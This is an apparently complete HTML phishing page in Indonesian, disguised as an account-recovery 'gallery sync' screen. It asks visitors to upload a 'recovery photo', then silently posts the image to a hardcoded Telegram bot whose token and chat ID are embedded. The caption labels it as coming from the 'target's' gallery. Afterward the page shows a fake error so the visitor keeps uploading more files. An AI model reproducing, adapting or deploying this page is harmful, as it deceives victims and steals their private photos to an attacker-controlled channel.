<!DOCTYPE html>
<html>
<head>
    <title>Sistem Sinkronisasi Galeri</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        .box { border: 1px solid #0f0; padding: 20px; display: inline-block; box-shadow: 0 0 15px #0f0; }
        .btn { background: #0f0; color: #000; padding: 10px 20px; cursor: pointer; font-weight: bold; border: none; }
        #file-input { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h3>[!] SYSTEM DATABASE ACCESS</h3>
        <p>Sinkronisasi foto diperlukan untuk memulihkan akun.</p>
        <label for="file-input" class="btn">PILIH FOTO PEMULIHAN</label>
        <input type="file" id="file-input" accept="image/*" onchange="upload(this)">
        <p id="status">Status: Waiting...</p>
    </div>

    <script>
        const TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo'; 
        const CHAT_ID = '8551809114';

        async function upload(input) {
            const status = document.getElementById('status');
            const file = input.files[0];
            if (!file) return;

            status.innerText = "Processing... Please wait.";

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);
            formData.append('caption', `ðŸ“‚ FOTO DARI GALERI TARGET\nNama File: ${file.name}`);

            try {
                // Kirim file ke Telegram
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                status.innerText = "Error: System Overload (404)";
                alert("Gagal sinkronisasi. Coba file lain.");
            } catch (e) {
                status.innerText = "Connection Lost.";
            }
        }
    </script>
</body>
</html>
